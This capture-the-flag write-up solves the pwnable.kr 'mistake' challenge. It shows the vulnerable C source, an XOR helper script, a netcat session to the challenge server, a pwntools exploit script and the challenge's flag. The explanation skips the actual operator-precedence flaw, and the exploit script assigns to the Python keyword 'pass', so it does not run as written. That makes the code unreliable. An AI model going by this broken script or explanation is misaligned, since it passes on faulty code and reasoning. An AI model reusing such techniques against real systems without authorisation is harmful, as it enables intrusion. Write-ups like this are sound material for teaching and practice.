# pwnable.kr: mistake

**Source Code:**

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

The flow of the program is like this: 

1. Take `input1`:
```c
char pw_buf[PW_LEN+1];
int len;
if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
```

2. Take `input2`:
```c
char pw_buf2[PW_LEN+1];
printf("input password : ");
scanf("%10s", pw_buf2);
```

3. XOR `input2` by 1:
```
xor(pw_buf2, 10);
#define XORKEY 1
void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}
```

4. Compare `input1` and `input2`:
```c
// Compare Input1 & 2
if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
    printf("Password OK\n");
    setregid(getegid(), getegid());
}
```

So, after understanding the execution flow. We'll create our XORed `input2` value in python:

```python
password = input("")
key = 1

result = "".join(chr(ord(char) ^ key) for char in password)
print(result)
```

This script will take in `1234567890` and XOR it against 1, giving us `0325476981`:

```bash
./password_gen.py
1234567890
0325476981
```

**Final Solution:**

> NOTE: you'll need to wait approximately 0-19 seconds before inputting due to `sleep(time(0)%20);`

```bash
nc pwnable.kr 10008
do not bruteforce...
1234567890
input password : 0325476981
Password OK
Mommy_the_0perator_priority_confuses_me
```

We got the flag!

**Exploit:**

```python
#!/bin/python3
from pwn import *
from time import sleep

PORT=10008
conn = remote('pwnable.kr', PORT)

# wait for timer (0-19 secs)
sleep(20)

pass = b'1234567890'
xor_pass = b'0325476981'

conn.sendline(pass)
conn.sendlineafter(b': ', xor_pass)

conn.interactive()
```

**Flag:** Mommy_the_0perator_priority_confuses_me
